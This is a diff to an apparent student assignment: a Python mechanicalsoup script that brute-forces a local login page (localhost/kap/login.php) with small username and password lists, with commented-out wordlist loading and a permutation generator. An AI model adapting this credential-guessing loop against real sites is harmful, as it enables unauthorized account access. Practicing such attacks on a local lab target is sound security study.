@@ -1,3 +1,7 @@
+# Maulida Meirisdiana   05311940000005
+# Dida Prasetyo Rahmat  05311940000019
+# Revina Rahmanisa H.   05311940000046
+
 import mechanicalsoup
 import itertools
 # from numpy import loadtxt
@@ -5,10 +9,10 @@ import itertools
 browser = mechanicalsoup.StatefulBrowser()
 username = ["user", "admin", "username"]
 passwords = ["admin", "password", "jhgqiMKW4K3WQdH"]
-# combinations = itertools.permutations("a-zA-Z0-9", 5)
+# username = loadtxt('username.txt', dtype=str)
+# passwords = loadtxt('password.txt', dtype=str)
 
-# username = loadtxt('probable-v2-top12000.txt', dtype=str)
-# passwords = loadtxt('middle-names.txt', dtype=str)
+# combinations = itertools.permutations("a-zA-Z0-9", 5)
 
 i = 0
 f = open("result.txt", "w")
@@ -40,6 +44,7 @@ f = open("result.txt", "w")
 
 for username in username:
     i = i + 1
+    print("\n##### Attempt - " + str(i))
     j = 0
     for password in passwords:
         browser.open("http://localhost/kap/login.php")
